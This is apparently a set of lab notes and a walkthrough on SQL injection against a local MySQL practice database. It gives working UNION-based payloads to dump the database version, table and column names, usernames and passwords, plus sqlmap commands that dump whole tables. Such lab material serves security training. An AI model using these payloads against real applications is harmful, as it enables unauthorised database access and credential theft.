# SQL Injection - Setup

```bash
# Start MySQL service
$ sudo systemctl start mysql

# Login to MySQL
$ sudo mysql

# Create database and tables
CREATE DATABASE sqldemo;
USE sqldemo;
CREATE TABLE users (
        username varchar(255),
        password varchar(255),
        age int,
        PRIMARY KEY (username)
);

# Insert data into the users table
INSERT INTO users (username, password, age)
VALUES ("jeremy", "letmein", 30), ("jessamy", "kittems", 31);
```

# Example of SQL Injection - UNION

- Check for SQL injection possibility with:
```
admin' OR 1=1# 
```
or 
```
admin' OR 1=1-- - 
```

- Determine the number of columns with:
```
admin' union select null,null,null#
```

# Dumping MySQL Version

```
admin' union select null,null,version()#
```

# Dumping Table Names

```
admin' union select null,null,table_name from information_schema.tables#
```

# Dumping Column Names

```
admin' union select null,null,column_name from information_schema.columns#
```

# Data Exfiltration

- Dump usernames:
```
admin' union select null,null,username from injection0x01#
```

- Dump passwords:
```
admin' union select null,null,password from injection0x01#
```

# SQL Injection - Blind Part 1

- Setup: Use `sqlmap` and `burpsuite`.
- Login with `jeremy:jeremy`.
- Intercept traffic in Burp Suite.
- Forward requests and view responses in "Proxy >> HTTP history".
- Check "HTTP history" tab for requests.
- Perform basic SQLI like `jeremy' OR 1=1#`.
- Use automated scanning with `sqlmap`.

# SQL Injection - Blind Part 2

- Save the request with the `Cookie: session` parameter.
- Use `sqlmap` with the saved request to identify vulnerabilities.
- Dump tables with commands like:

```bash
$ sqlmap -r request.txt --level=2 --dump -T injection0x02
```

# SQL Injection - Challenge Walkthrough

## Manual 

- Use the `UNION SELECT` query.
- Add `null` values until successful, e.g.:

```
senpai' union select null,null,null,null#
```

- Enumerate tables and dump content.

## SQLMAP

- Intercept request in Burp and save to file.
- Run SQLMAP to dump tables, e.g.:

```bash
$ sqlmap -r request.txt --level=2 --dump -T injection0x03_users
```